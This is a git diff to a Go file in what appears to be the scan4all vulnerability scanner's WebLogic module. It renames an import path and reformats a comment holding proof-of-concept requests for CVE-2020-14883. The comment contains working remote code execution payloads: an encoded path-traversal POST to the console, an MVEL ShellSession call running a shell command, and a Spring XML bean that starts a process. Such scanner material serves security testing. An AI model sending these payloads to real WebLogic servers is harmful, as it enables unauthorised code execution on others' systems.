@@ -1,7 +1,7 @@
 package weblogic
 
 import (
-	"github.com/hktalent/ProScan4all/lib/util"
+	"github.com/hktalent/scan4all/lib/util"
 )
 
 /*
@@ -35,22 +35,23 @@ Content-Length: 117
 _nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/CVE-2020-14883.txt');")
 Proof of Concept (PoC) 3: using com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext for Windows-based targets
 
-Content of poc.xml file
+# Content of poc.xml file
 
 <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
-    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
-        <constructor-arg>
-            <list>
-                <value>cmd</value>
-                <value>/c</value>
-                <value>
-                    <![CDATA[calc]]>
-                </value>
-            </list>
-        </constructor-arg>
-    </bean>
-</beans>
 
+	<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+	    <constructor-arg>
+	        <list>
+	            <value>cmd</value>
+	            <value>/c</value>
+	            <value>
+	                <![CDATA[calc]]>
+	            </value>
+	        </list>
+	    </constructor-arg>
+	</bean>
+
+</beans>
 
 POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
 Host: vulnerablehost:7001
